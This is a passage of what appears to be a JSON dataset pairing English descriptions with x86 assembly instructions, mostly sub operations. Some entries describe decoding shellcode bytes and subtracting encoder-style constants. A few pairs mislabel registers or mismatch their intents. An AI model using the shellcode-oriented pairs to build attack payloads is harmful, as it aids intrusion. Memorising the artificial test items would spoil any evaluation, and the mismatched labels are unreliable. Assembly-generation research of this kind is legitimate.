      "define",
      "string",
      "byte",
      "string",
      "var0"
    ],
    "snippet_tokens": [
      "string",
      ":",
      "db",
      "var0"
    ]
  },
  {
    "intent": "define string as the byte string 'file1.txt'",
    "rewritten_intent": "define string as the byte string 'file1.txt'",
    "snippet": "string: db 'file1.txt'",
    "slot_map": {
      "'file1.txt'": "var0"
    },
    "intent_tokens": [
      "define",
      "string",
      "byte",
      "string",
      "var0"
    ],
    "snippet_tokens": [
      "string",
      ":",
      "db",
      "var0"
    ]
  },
  {
    "intent": "define string as the byte string 'prova.txt'",
    "rewritten_intent": "define string as the byte string 'prova.txt'",
    "snippet": "string: db 'prova.txt'",
    "slot_map": {
      "'prova.txt'": "var0"
    },
    "intent_tokens": [
      "define",
      "string",
      "byte",
      "string",
      "var0"
    ],
    "snippet_tokens": [
      "string",
      ":",
      "db",
      "var0"
    ]
  },
  {
    "intent": "define string as the byte string 'tmp.txt'",
    "rewritten_intent": "define string as the byte string 'tmp.txt'",
    "snippet": "string: db 'tmp.txt'",
    "slot_map": {
      "'tmp.txt'": "var0"
    },
    "intent_tokens": [
      "define",
      "string",
      "byte",
      "string",
      "var0"
    ],
    "snippet_tokens": [
      "string",
      ":",
      "db",
      "var0"
    ]
  },
  {
    "intent": "subtract the contents of esi from the 32-bit integer stored at memory location var",
    "rewritten_intent": "subtract the contents of esi from the 32-bit integer stored at memory location var",
    "snippet": "sub [var], esi",
    "slot_map": {
      "32-bit": "var1",
      "esi": "var0"
    },
    "intent_tokens": [
      "subtract",
      "contents",
      "var0",
      "var1",
      "integer",
      "stored",
      "memory",
      "location",
      "var"
    ],
    "snippet_tokens": [
      "sub",
      "[",
      "var",
      "]",
      ",",
      "var0"
    ]
  },
  {
    "intent": "subtract the contents of esi from the 32-bit integer stored at memory location var2",
    "rewritten_intent": "subtract the contents of esi from the 32-bit integer stored at memory location var2",
    "snippet": "sub [var2], esi",
    "slot_map": {
      "32-bit": "var1",
      "esi": "var0",
      "var2": "var2"
    },
    "intent_tokens": [
      "subtract",
      "contents",
      "var0",
      "var1",
      "integer",
      "stored",
      "memory",
      "location",
      "var2"
    ],
    "snippet_tokens": [
      "sub",
      "[",
      "var2",
      "]",
      ",",
      "var0"
    ]
  },
  {
    "intent": "subtract 0x13 from the al register",
    "rewritten_intent": "subtract 0x13 from the al register",
    "snippet": "sub al, 0x13",
    "slot_map": {
      "0x13": "var0"
    },
    "intent_tokens": [
      "subtract",
      "var0",
      "al",
      "register"
    ],
    "snippet_tokens": [
      "sub",
      "al",
      ",",
      "var0"
    ]
  },
  {
    "intent": "subtract 0x41 from the al register",
    "rewritten_intent": "subtract 0x41 from the al register",
    "snippet": "sub al, 0x41",
    "slot_map": {
      "0x41": "var0"
    },
    "intent_tokens": [
      "subtract",
      "var0",
      "al",
      "register"
    ],
    "snippet_tokens": [
      "sub",
      "al",
      ",",
      "var0"
    ]
  },
  {
    "intent": "subtract the value 1 from the contents of the al register and jump to the l1 label if the result is not negative",
    "rewritten_intent": "subtract the value 1 from the contents of the al register and jump to the l1 label if the result is not negative",
    "snippet": "sub al, 1 \\n jns l1",
    "slot_map": {
      "l1": "var0"
    },
    "intent_tokens": [
      "subtract",
      "value",
      "1",
      "contents",
      "al",
      "register",
      "and",
      "jump",
      "var0",
      "label",
      "if",
      "result",
      "not",
      "negative"
    ],
    "snippet_tokens": [
      "sub",
      "al",
      ",",
      "1",
      "\\n",
      "jns",
      "var0"
    ]
  },
  {
    "intent": "subtract the value 1 from the contents of the al register and jump to the l1 label if the result is not zero",
    "rewritten_intent": "subtract the value 1 from the contents of the al register and jump to the l1 label if the result is not zero",
    "snippet": "sub al, 1 \\n jnz l1",
    "slot_map": {
      "l1": "var0"
    },
    "intent_tokens": [
      "subtract",
      "value",
      "1",
      "contents",
      "al",
      "register",
      "and",
      "jump",
      "var0",
      "label",
      "if",
      "result",
      "not",
      "zero"
    ],
    "snippet_tokens": [
      "sub",
      "al",
      ",",
      "1",
      "\\n",
      "jnz",
      "var0"
    ]
  },
  {
    "intent": "subtract 88 from the contents of al register and save the result in al",
    "rewritten_intent": "subtract 88 from the contents of al register and save the result in al",
    "snippet": "sub al, 88",
    "slot_map": {},
    "intent_tokens": [
      "subtract",
      "88",
      "contents",
      "al",
      "register",
      "and",
      "save",
      "result",
      "al"
    ],
    "snippet_tokens": [
      "sub",
      "al",
      ",",
      "88"
    ]
  },
  {
    "intent": "subtract 88 from the contents of the al register",
    "rewritten_intent": "subtract 88 from the contents of the al register",
    "snippet": "sub al, 88",
    "slot_map": {},
    "intent_tokens": [
      "subtract",
      "88",
      "contents",
      "al",
      "register"
    ],
    "snippet_tokens": [
      "sub",
      "al",
      ",",
      "88"
    ]
  },
  {
    "intent": "subtract ah from al",
    "rewritten_intent": "subtract ah from al",
    "snippet": "sub al, ah",
    "slot_map": {
      "ah": "var0"
    },
    "intent_tokens": [
      "subtract",
      "var0",
      "al"
    ],
    "snippet_tokens": [
      "sub",
      "al",
      ",",
      "var0"
    ]
  },
  {
    "intent": "subtract 1564 from ax and save the result into ax",
    "rewritten_intent": "subtract 1564 from ax and save the result into ax",
    "snippet": "sub ax, 1564",
    "slot_map": {},
    "intent_tokens": [
      "subtract",
      "1564",
      "ax",
      "and",
      "save",
      "result",
      "ax"
    ],
    "snippet_tokens": [
      "sub",
      "ax",
      ",",
      "1564"
    ]
  },
  {
    "intent": "subtract 1564 from the contents of ax register and save the result in ax",
    "rewritten_intent": "subtract 1564 from the contents of ax register and save the result in ax",
    "snippet": "sub ax, 1564",
    "slot_map": {},
    "intent_tokens": [
      "subtract",
      "1564",
      "contents",
      "ax",
      "register",
      "and",
      "save",
      "result",
      "ax"
    ],
    "snippet_tokens": [
      "sub",
      "ax",
      ",",
      "1564"
    ]
  },
  {
    "intent": "subtract 1662 from ax and save the result into ax",
    "rewritten_intent": "subtract 1662 from ax and save the result into ax",
    "snippet": "sub ax, 1662",
    "slot_map": {},
    "intent_tokens": [
      "subtract",
      "1662",
      "ax",
      "and",
      "save",
      "result",
      "ax"
    ],
    "snippet_tokens": [
      "sub",
      "ax",
      ",",
      "1662"
    ]
  },
  {
    "intent": "subtract 1662 from the contents of ax register and save the result in ax",
    "rewritten_intent": "subtract 1662 from the contents of ax register and save the result in ax",
    "snippet": "sub ax, 1662",
    "slot_map": {},
    "intent_tokens": [
      "subtract",
      "1662",
      "contents",
      "ax",
      "register",
      "and",
      "save",
      "result",
      "ax"
    ],
    "snippet_tokens": [
      "sub",
      "ax",
      ",",
      "1662"
    ]
  },
  {
    "intent": "subtract the contents of the ax register by 1662",
    "rewritten_intent": "subtract the contents of the ax register by 1662",
    "snippet": "sub ax, 1662",
    "slot_map": {},
    "intent_tokens": [
      "subtract",
      "contents",
      "ax",
      "register",
      "1662"
    ],
    "snippet_tokens": [
      "sub",
      "ax",
      ",",
      "1662"
    ]
  },
  {
    "intent": "subtract the contents of ax from the contents of ax",
    "rewritten_intent": "subtract the contents of ax from the contents of ax",
    "snippet": "sub ax, ax",
    "slot_map": {},
    "intent_tokens": [
      "subtract",
      "contents",
      "ax",
      "contents",
      "ax"
    ],
    "snippet_tokens": [
      "sub",
      "ax",
      ",",
      "ax"
    ]
  },
  {
    "intent": "subtract 0x7 from bl and save the result into bl",
    "rewritten_intent": "subtract 0x7 from bl and save the result into bl",
    "snippet": "sub bl, 0x7",
    "slot_map": {
      "0x7": "var0",
      "bl": "var1"
    },
    "intent_tokens": [
      "subtract",
      "var0",
      "var1",
      "and",
      "save",
      "result",
      "var1"
    ],
    "snippet_tokens": [
      "sub",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "subtract 0x7 from the contents in bl and save the result in bl",
    "rewritten_intent": "subtract 0x7 from the contents in bl and save the result in bl",
    "snippet": "sub bl, 0x7",
    "slot_map": {
      "0x7": "var0",
      "bl": "var1"
    },
    "intent_tokens": [
      "subtract",
      "var0",
      "contents",
      "var1",
      "and",
      "save",
      "result",
      "var1"
    ],
    "snippet_tokens": [
      "sub",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "subtract 3 from the contents of the bl register",
    "rewritten_intent": "subtract 3 from the contents of the bl register",
    "snippet": "sub bl, 3",
    "slot_map": {
      "bl": "var0"
    },
    "intent_tokens": [
      "subtract",
      "3",
      "contents",
      "var0",
      "register"
    ],
    "snippet_tokens": [
      "sub",
      "var0",
      ",",
      "3"
    ]
  },
  {
    "intent": "subtract the value 3 from the contents of the bl register and jump to the stage label if the result is not zero",
    "rewritten_intent": "subtract the value 3 from the contents of the bl register and jump to the stage label if the result is not zero",
    "snippet": "sub bl, 3 \\n jnz stage",
    "slot_map": {
      "bl": "var0"
    },
    "intent_tokens": [
      "subtract",
      "value",
      "3",
      "contents",
      "var0",
      "register",
      "and",
      "jump",
      "stage",
      "label",
      "if",
      "result",
      "not",
      "zero"
    ],
    "snippet_tokens": [
      "sub",
      "var0",
      ",",
      "3",
      "\\n",
      "jnz",
      "stage"
    ]
  },
  {
    "intent": "subtract the value 4 from the contents of the bl register and jump to the l2 label if the result is not negative",
    "rewritten_intent": "subtract the value 4 from the contents of the bl register and jump to the l2 label if the result is not negative",
    "snippet": "sub bl, 4 \\n jns l2",
    "slot_map": {
      "bl": "var0",
      "l2": "var1"
    },
    "intent_tokens": [
      "subtract",
      "value",
      "4",
      "contents",
      "var0",
      "register",
      "and",
      "jump",
      "var1",
      "label",
      "if",
      "result",
      "not",
      "negative"
    ],
    "snippet_tokens": [
      "sub",
      "var0",
      ",",
      "4",
      "\\n",
      "jns",
      "var1"
    ]
  },
  {
    "intent": "subtract the decimal value 48 from the nl register",
    "rewritten_intent": "subtract the decimal value 48 from the nl register",
    "snippet": "sub bl, 48",
    "slot_map": {
      "nl": "var0"
    },
    "intent_tokens": [
      "subtract",
      "decimal",
      "value",
      "48",
      "var0",
      "register"
    ],
    "snippet_tokens": [
      "sub",
      "bl",
      ",",
      "48"
    ]
  },
  {
    "intent": "subtract the contents of the cl register from the contents of the al register and jump to the l2 label if the result is not zero",
    "rewritten_intent": "subtract the contents of the cl register from the contents of the al register and jump to the l2 label if the result is not zero",
    "snippet": "sub bl, cl \\n jnz l2",
    "slot_map": {
      "l2": "var0"
    },
    "intent_tokens": [
      "subtract",
      "contents",
      "cl",
      "register",
      "contents",
      "al",
      "register",
      "and",
      "jump",
      "var0",
      "label",
      "if",
      "result",
      "not",
      "zero"
    ],
    "snippet_tokens": [
      "sub",
      "bl",
      ",",
      "cl",
      "\\n",
      "jnz",
      "var0"
    ]
  },
  {
    "intent": "subtract the byte in esi from the bl register",
    "rewritten_intent": "subtract the byte in esi from the bl register",
    "snippet": "sub bl,byte [esi]",
    "slot_map": {
      "esi": "var0",
      "bl": "var1"
    },
    "intent_tokens": [
      "subtract",
      "byte",
      "var0",
      "var1",
      "register"
    ],
    "snippet_tokens": [
      "sub",
      "var1",
      ",",
      "byte",
      "[",
      "var0",
      "]"
    ]
  },
  {
    "intent": "subtract 1634 from bx and save the result into bx",
    "rewritten_intent": "subtract 1634 from bx and save the result into bx",
    "snippet": "sub bx, 1634",
    "slot_map": {
      "bx": "var0"
    },
    "intent_tokens": [
      "subtract",
      "1634",
      "var0",
      "and",
      "save",
      "result",
      "var0"
    ],
    "snippet_tokens": [
      "sub",
      "var0",
      ",",
      "1634"
    ]
  },
  {
    "intent": "subtract 1634 from the contents of bx register and save the result in bx",
    "rewritten_intent": "subtract 1634 from the contents of bx register and save the result in bx",
    "snippet": "sub bx, 1634",
    "slot_map": {
      "bx": "var0"
    },
    "intent_tokens": [
      "subtract",
      "1634",
      "contents",
      "var0",
      "register",
      "and",
      "save",
      "result",
      "var0"
    ],
    "snippet_tokens": [
      "sub",
      "var0",
      ",",
      "1634"
    ]
  },
  {
    "intent": "subtract 1634 from the contents of the bx register",
    "rewritten_intent": "subtract 1634 from the contents of the bx register",
    "snippet": "sub bx, 1634",
    "slot_map": {
      "bx": "var0"
    },
    "intent_tokens": [
      "subtract",
      "1634",
      "contents",
      "var0",
      "register"
    ],
    "snippet_tokens": [
      "sub",
      "var0",
      ",",
      "1634"
    ]
  },
  {
    "intent": "subtract 1663 from bx and save the result into bx",
    "rewritten_intent": "subtract 1663 from bx and save the result into bx",
    "snippet": "sub bx, 1663",
    "slot_map": {
      "bx": "var0"
    },
    "intent_tokens": [
      "subtract",
      "1663",
      "var0",
      "and",
      "save",
      "result",
      "var0"
    ],
    "snippet_tokens": [
      "sub",
      "var0",
      ",",
      "1663"
    ]
  },
  {
    "intent": "subtract 1663 from the contents of the bx register",
    "rewritten_intent": "subtract 1663 from the contents of the bx register",
    "snippet": "sub bx, 1663",
    "slot_map": {
      "bx": "var0"
    },
    "intent_tokens": [
      "subtract",
      "1663",
      "contents",
      "var0",
      "register"
    ],
    "snippet_tokens": [
      "sub",
      "var0",
      ",",
      "1663"
    ]
  },
  {
    "intent": "subtract the contents of bx register by 1663 and save the result in bx",
    "rewritten_intent": "subtract the contents of bx register by 1663 and save the result in bx",
    "snippet": "sub bx, 1663",
    "slot_map": {
      "bx": "var0"
    },
    "intent_tokens": [
      "subtract",
      "contents",
      "var0",
      "register",
      "1663",
      "and",
      "save",
      "result",
      "var0"
    ],
    "snippet_tokens": [
      "sub",
      "var0",
      ",",
      "1663"
    ]
  },
  {
    "intent": "subtract the contents of bx from the contents of bx",
    "rewritten_intent": "subtract the contents of bx from the contents of bx",
    "snippet": "sub bx, bx",
    "slot_map": {
      "bx": "var0"
    },
    "intent_tokens": [
      "subtract",
      "contents",
      "var0",
      "contents",
      "var0"
    ],
    "snippet_tokens": [
      "sub",
      "var0",
      ",",
      "var0"
    ]
  },
  {
    "intent": "subtract the contents of the dx register from the contents of the bx register",
    "rewritten_intent": "subtract the contents of the dx register from the contents of the bx register",
    "snippet": "sub bx, dx",
    "slot_map": {
      "dx": "var0",
      "bx": "var1"
    },
    "intent_tokens": [
      "subtract",
      "contents",
      "var0",
      "register",
      "contents",
      "var1",
      "register"
    ],
    "snippet_tokens": [
      "sub",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "subtract 20h from the 8-bit at memory location buff",
    "rewritten_intent": "subtract 20h from the 8-bit at memory location buff",
    "snippet": "sub byte [buff],20h",
    "slot_map": {
      "8-bit": "var1",
      "20h": "var0"
    },
    "intent_tokens": [
      "subtract",
      "var0",
      "var1",
      "memory",
      "location",
      "buff"
    ],
    "snippet_tokens": [
      "sub",
      "byte",
      "[",
      "buff",
      "]",
      ",",
      "var0"
    ]
  },
  {
    "intent": "subtract 20h from the 8-bit at memory location ebp+ecx",
    "rewritten_intent": "subtract 20h from the 8-bit at memory location ebp+ecx",
    "snippet": "sub byte [ebp+ecx],20h",
    "slot_map": {
      "8-bit": "var1",
      "ebp+ecx": "var2",
      "20h": "var0"
    },
    "intent_tokens": [
      "subtract",
      "var0",
      "var1",
      "memory",
      "location",
      "ebp+ecx"
    ],
    "snippet_tokens": [
      "sub",
      "byte",
      "[",
      "var2",
      "]",
      ",",
      "var0"
    ]
  },
  {
    "intent": "subtract 0x4 from the byte at the address edi and negate the result",
    "rewritten_intent": "subtract 0x4 from the byte at the address edi and negate the result",
    "snippet": "sub byte [edi], 0x4 \\n not byte [edi]",
    "slot_map": {
      "0x4": "var0",
      "edi": "var1"
    },
    "intent_tokens": [
      "subtract",
      "var0",
      "byte",
      "address",
      "var1",
      "and",
      "negate",
      "result"
    ],
    "snippet_tokens": [
      "sub",
      "byte",
      "[",
      "var1",
      "]",
      ",",
      "var0",
      "\\n",
      "not",
      "byte",
      "[",
      "var1",
      "]"
    ]
  },
  {
    "intent": "negate the byte at the address edi after subtracting the value 7",
    "rewritten_intent": "negate the byte at the address edi after subtracting the value 7",
    "snippet": "sub byte [edi], 7 \\n not byte [edi]",
    "slot_map": {
      "edi": "var0"
    },
    "intent_tokens": [
      "negate",
      "byte",
      "address",
      "var0",
      "after",
      "subtracting",
      "value",
      "7"
    ],
    "snippet_tokens": [
      "sub",
      "byte",
      "[",
      "var0",
      "]",
      ",",
      "7",
      "\\n",
      "not",
      "byte",
      "[",
      "var0",
      "]"
    ]
  },
  {
    "intent": "subtract the value 8 from the byte in edi and negate it",
    "rewritten_intent": "subtract the value 8 from the byte in edi and negate it",
    "snippet": "sub byte [edi], 8 \\n not byte [edi]",
    "slot_map": {
      "edi": "var0"
    },
    "intent_tokens": [
      "subtract",
      "value",
      "8",
      "byte",
      "var0",
      "and",
      "negate",
      "it"
    ],
    "snippet_tokens": [
      "sub",
      "byte",
      "[",
      "var0",
      "]",
      ",",
      "8",
      "\\n",
      "not",
      "byte",
      "[",
      "var0",
      "]"
    ]
  },
  {
    "intent": "subtract 0x1 from the current byte of the shellcode and negate the result",
    "rewritten_intent": "subtract 0x1 from the current byte of the shellcode and negate the result",
    "snippet": "sub byte [esi], 0x1 \\n not byte [esi]",
    "slot_map": {
      "0x1": "var0"
    },
    "intent_tokens": [
      "subtract",
      "var0",
      "current",
      "byte",
      "shellcode",
      "and",
      "negate",
      "result"
    ],
    "snippet_tokens": [
      "sub",
      "byte",
      "[",
      "esi",
      "]",
      ",",
      "var0",
      "\\n",
      "not",
      "byte",
      "[",
      "esi",
      "]"
    ]
  },
  {
    "intent": "subtract 0x1 from the byte at the address esi and negate the result",
    "rewritten_intent": "subtract 0x1 from the byte at the address esi and negate the result",
    "snippet": "sub byte [esi], 0x1 \\n not byte [esi]",
    "slot_map": {
      "0x1": "var0",
      "esi": "var1"
    },
    "intent_tokens": [
      "subtract",
      "var0",
      "byte",
      "address",
      "var1",
      "and",
      "negate",
      "result"
    ],
    "snippet_tokens": [
      "sub",
      "byte",
      "[",
      "var1",
      "]",
      ",",
      "var0",
      "\\n",
      "not",
      "byte",
      "[",
      "var1",
      "]"
    ]
  },
  {
    "intent": "subtract the value 0x9 from the current byte of the shellcode and then negate the result",
    "rewritten_intent": "subtract the value 0x9 from the current byte of the shellcode and then negate the result",
    "snippet": "sub byte [esi], 0x9 \\n not byte [esi]",
    "slot_map": {
      "0x9": "var0"
    },
    "intent_tokens": [
      "subtract",
      "value",
      "var0",
      "current",
      "byte",
      "shellcode",
      "and",
      "then",
      "negate",
      "result"
    ],
    "snippet_tokens": [
      "sub",
      "byte",
      "[",
      "esi",
      "]",
      ",",
      "var0",
      "\\n",
      "not",
      "byte",
      "[",
      "esi",
      "]"
    ]
  },
  {
    "intent": "subtract 0xd from the byte at the address esi",
    "rewritten_intent": "subtract 0xd from the byte at the address esi",
    "snippet": "sub byte [esi], 0xd",
    "slot_map": {
      "0xd": "var0",
      "esi": "var1"
    },
    "intent_tokens": [
      "subtract",
      "var0",
      "byte",
      "address",
      "var1"
    ],
    "snippet_tokens": [
      "sub",
      "byte",
      "[",
      "var1",
      "]",
      ",",
      "var0"
    ]
  },
  {
    "intent": "subtract 13 from the byte at the address esi",
    "rewritten_intent": "subtract 13 from the byte at the address esi",
    "snippet": "sub byte [esi], 13",
    "slot_map": {
      "esi": "var0"
    },
    "intent_tokens": [
      "subtract",
      "13",
      "byte",
      "address",
      "var0"
    ],
    "snippet_tokens": [
      "sub",
      "byte",
      "[",
      "var0",
      "]",
      ",",
      "13"
    ]
  },
  {
    "intent": "subtract 13 from the byte in esi and save the result in esi",
    "rewritten_intent": "subtract 13 from the byte in esi and save the result in esi",
    "snippet": "sub byte [esi], 13",
    "slot_map": {
      "esi": "var0"
    },
    "intent_tokens": [
      "subtract",
      "13",
      "byte",
      "var0",
      "and",
      "save",
      "result",
      "var0"
    ],
    "snippet_tokens": [
      "sub",
      "byte",
      "[",
      "var0",
      "]",
      ",",
      "13"
    ]
  },
  {
    "intent": "negate the byte at the address esi after subtracting the value 2",
    "rewritten_intent": "negate the byte at the address esi after subtracting the value 2",
    "snippet": "sub byte [esi], 2 \\n not byte [esi]",
    "slot_map": {
      "esi": "var0"
    },
    "intent_tokens": [
      "negate",
      "byte",
      "address",
      "var0",
      "after",
      "subtracting",
      "value",
      "2"
    ],
    "snippet_tokens": [
      "sub",
      "byte",
      "[",
      "var0",
      "]",
      ",",
      "2",
      "\\n",
      "not",
      "byte",
      "[",
      "var0",
      "]"
    ]
  },
  {
    "intent": "subtract 1 from the contents of the cl register",
    "rewritten_intent": "subtract 1 from the contents of the cl register",
    "snippet": "sub cl, 1",
    "slot_map": {},
    "intent_tokens": [
      "subtract",
      "1",
      "contents",
      "cl",
      "register"
    ],
    "snippet_tokens": [
      "sub",
      "cl",
      ",",
      "1"
    ]
  },
  {
    "intent": "subtract the contents of the bl register from the contents of the cl register and jump to the l3 label if the result is not negative",
    "rewritten_intent": "subtract the contents of the bl register from the contents of the cl register and jump to the l3 label if the result is not negative",
    "snippet": "sub cl, bl \\n jns l3",
    "slot_map": {
      "bl": "var0",
      "l3": "var1"
    },
    "intent_tokens": [
      "subtract",
      "contents",
      "var0",
      "register",
      "contents",
      "cl",
      "register",
      "and",
      "jump",
      "var1",
      "label",
      "if",
      "result",
      "not",
      "negative"
    ],
    "snippet_tokens": [
      "sub",
      "cl",
      ",",
      "var0",
      "\\n",
      "jns",
      "var1"
    ]
  },
  {
    "intent": "subtract 0x7ff from the contents in cx and save the result in cx",
    "rewritten_intent": "subtract 0x7ff from the contents in cx and save the result in cx",
    "snippet": "sub cx, 0x7ff",
    "slot_map": {
      "0x7ff": "var0"
    },
    "intent_tokens": [
      "subtract",
      "var0",
      "contents",
      "cx",
      "and",
      "save",
      "result",
      "cx"
    ],
    "snippet_tokens": [
      "sub",
      "cx",
      ",",
      "var0"
    ]
  },
  {
    "intent": "subtract 0x7ff from the contents of cx register value and save the result in cx",
    "rewritten_intent": "subtract 0x7ff from the contents of cx register value and save the result in cx",
    "snippet": "sub cx, 0x7ff",
    "slot_map": {
      "0x7ff": "var0"
    },
    "intent_tokens": [
      "subtract",
      "var0",
      "contents",
      "cx",
      "register",
      "value",
      "and",
      "save",
      "result",
      "cx"
    ],
    "snippet_tokens": [
      "sub",
      "cx",
      ",",
      "var0"
    ]
  },
  {
    "intent": "subtract the value 5 from the contents of the dl register and jump to the l4 label if the result is not negative",
    "rewritten_intent": "subtract the value 5 from the contents of the dl register and jump to the l4 label if the result is not negative",
    "snippet": "sub dl, 5 \\n jns l4",
    "slot_map": {
      "l4": "var0"
    },
    "intent_tokens": [
      "subtract",
      "value",
      "5",
      "contents",
      "dl",
      "register",
      "and",
      "jump",
      "var0",
      "label",
      "if",
      "result",
      "not",
      "negative"
    ],
    "snippet_tokens": [
      "sub",
      "dl",
      ",",
      "5",
      "\\n",
      "jns",
      "var0"
    ]
  },
  {
    "intent": "subtract the contents of al register from the contents of dl register and save the result in dl",
    "rewritten_intent": "subtract the contents of al register from the contents of dl register and save the result in dl",
    "snippet": "sub dl, al",
    "slot_map": {},
    "intent_tokens": [
      "subtract",
      "contents",
      "al",
      "register",
      "contents",
      "dl",
      "register",
      "and",
      "save",
      "result",
      "dl"
    ],
    "snippet_tokens": [
      "sub",
      "dl",
      ",",
      "al"
    ]
  },
  {
    "intent": "subtract the byte at the address esi from the contents of the dl register",
    "rewritten_intent": "subtract the byte at the address esi from the contents of the dl register",
    "snippet": "sub dl, byte [esi]",
    "slot_map": {
      "esi": "var0"
    },
    "intent_tokens": [
      "subtract",
      "byte",
      "address",
      "var0",
      "contents",
      "dl",
      "register"
    ],
    "snippet_tokens": [
      "sub",
      "dl",
      ",",
      "byte",
      "[",
      "var0",
      "]"
    ]
  },
  {
    "intent": "subtract 15444 from dx and save the result into dx",
    "rewritten_intent": "subtract 15444 from dx and save the result into dx",
    "snippet": "sub dx, 15444",
    "slot_map": {
      "dx": "var0"
    },
    "intent_tokens": [
      "subtract",
      "15444",
      "var0",
      "and",
      "save",
      "result",
      "var0"
    ],
    "snippet_tokens": [
      "sub",
      "var0",
      ",",
      "15444"
    ]
  },
  {
    "intent": "subtract 15444 from the contents of the dx register",
    "rewritten_intent": "subtract 15444 from the contents of the dx register",
    "snippet": "sub dx, 15444",
    "slot_map": {
      "dx": "var0"
    },
    "intent_tokens": [
      "subtract",
      "15444",
      "contents",
      "var0",
      "register"
    ],
    "snippet_tokens": [
      "sub",
      "var0",
      ",",
      "15444"
    ]
  },
  {
    "intent": "subtract the value of the memory at address esp from eax and store into eax",
    "rewritten_intent": "subtract the value of the memory at address esp from eax and store into eax",
    "snippet": "sub eax, [esp]",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "subtract",
      "value",
      "memory",
      "address",
      "esp",
      "var0",
      "and",
      "store",
      "var0"
    ],
    "snippet_tokens": [
      "sub",
      "var0",
      ",",
      "[",
      "esp",
      "]"
    ]
  },
  {
    "intent": "subtract 0x013ffeff from the contents in eax and save the result in eax",
    "rewritten_intent": "subtract 0x013ffeff from the contents in eax and save the result in eax",
    "snippet": "sub eax, 0x013ffeff",
    "slot_map": {
      "0x013ffeff": "var0",
      "eax": "var1"
    },
    "intent_tokens": [
      "subtract",
      "var0",
      "contents",
      "var1",
      "and",
      "save",
      "result",
      "var1"
    ],
    "snippet_tokens": [
      "sub",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "subtract 0x04feca01 from the contents in eax and save the result in eax",
    "rewritten_intent": "subtract 0x04feca01 from the contents in eax and save the result in eax",
    "snippet": "sub eax, 0x04feca01",
    "slot_map": {
      "0x04feca01": "var0",
      "eax": "var1"
    },
    "intent_tokens": [
      "subtract",
      "var0",
      "contents",
      "var1",
      "and",
      "save",
      "result",
      "var1"
    ],
    "snippet_tokens": [
      "sub",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "subtract 0x0efc3532 from the contents in eax and save the result in eax",
    "rewritten_intent": "subtract 0x0efc3532 from the contents in eax and save the result in eax",
    "snippet": "sub eax, 0x0efc3532",
    "slot_map": {
      "0x0efc3532": "var0",
      "eax": "var1"
    },
    "intent_tokens": [
      "subtract",
      "var0",
      "contents",
      "var1",
      "and",
      "save",
      "result",
      "var1"
    ],
    "snippet_tokens": [
      "sub",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "subtract 0x2c3d2dff from the contents in eax and save the result in eax",
    "rewritten_intent": "subtract 0x2c3d2dff from the contents in eax and save the result in eax",
    "snippet": "sub eax, 0x2c3d2dff",
    "slot_map": {
      "0x2c3d2dff": "var0",
      "eax": "var1"
    },
    "intent_tokens": [
      "subtract",
      "var0",
      "contents",
      "var1",
      "and",
      "save",
      "result",
      "var1"
    ],
    "snippet_tokens": [
      "sub",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "subtract 0x3217d6d2 from the contents in eax and save the result in eax",
    "rewritten_intent": "subtract 0x3217d6d2 from the contents in eax and save the result in eax",
    "snippet": "sub eax, 0x3217d6d2",
    "slot_map": {
      "0x3217d6d2": "var0",
      "eax": "var1"
    },
    "intent_tokens": [
      "subtract",
      "var0",
      "contents",
      "var1",
      "and",
      "save",
      "result",
      "var1"
    ],
    "snippet_tokens": [
      "sub",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "subtract 0x3bd04ede from the contents in eax and save the result in eax",
    "rewritten_intent": "subtract 0x3bd04ede from the contents in eax and save the result in eax",
    "snippet": "sub eax, 0x3bd04ede",
    "slot_map": {
      "0x3bd04ede": "var0",
      "eax": "var1"
    },
    "intent_tokens": [
      "subtract",
      "var0",
      "contents",
      "var1",
      "and",
      "save",
      "result",
      "var1"
    ],
    "snippet_tokens": [
      "sub",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "subtract 0x70445eaf from the contents in eax and save the result in eax",
    "rewritten_intent": "subtract 0x70445eaf from the contents in eax and save the result in eax",
    "snippet": "sub eax, 0x70445eaf",
    "slot_map": {
      "0x70445eaf": "var0",
      "eax": "var1"
    },
    "intent_tokens": [
      "subtract",
      "var0",
      "contents",
      "var1",
      "and",
      "save",
      "result",
      "var1"
    ],
    "snippet_tokens": [
      "sub",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "subtract 216 from the value stored in eax",
    "rewritten_intent": "subtract 216 from the value stored in eax",
    "snippet": "sub eax, 216",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "subtract",
      "216",
      "value",
      "stored",
      "var0"
    ],
    "snippet_tokens": [
      "sub",
      "var0",
      ",",
      "216"
    ]
  },
  {
    "intent": "decrease eax by 3",
    "rewritten_intent": "decrease eax by 3",
    "snippet": "sub eax, 3",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "decrease",
      "var0",
      "3"
    ],
    "snippet_tokens": [
      "sub",
      "var0",
      ",",
      "3"
    ]
  },
  {
    "intent": "subtract 3e716230 from the contents of the eax register",
    "rewritten_intent": "subtract 3e716230 from the contents of the eax register",
    "snippet": "sub eax, 3e716230",
    "slot_map": {
      "3e716230": "var0",
      "eax": "var1"
    },
    "intent_tokens": [
      "subtract",
      "var0",
      "contents",
      "var1",
      "register"
    ],
    "snippet_tokens": [
      "sub",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "subtract 5d455523 from the contents of the eax register",
    "rewritten_intent": "subtract 5d455523 from the contents of the eax register",
    "snippet": "sub eax, 5d455523",
    "slot_map": {
      "5d455523": "var0",
      "eax": "var1"
    },
    "intent_tokens": [
      "subtract",
      "var0",
      "contents",
      "var1",
      "register"
    ],
    "snippet_tokens": [
      "sub",
      "var1",
      ",",
      "var0"
    ]
  },
  {
    "intent": "subtract 5e5d7722 from the contents of the eax register",
    "rewritten_intent": "subtract 5e5d7722 from the contents of the eax register",
    "snippet": "sub eax, 5e5d7722",
    "slot_map": {
      "eax": "var0"
    },
    "intent_tokens": [
      "subtract",
      "5e5d7722",
      "contents",
      "var0",
      "register"
    ],
    "snippet_tokens": [
      "sub",
      "var0",
      ",",
      "5e5d7722"
    ]
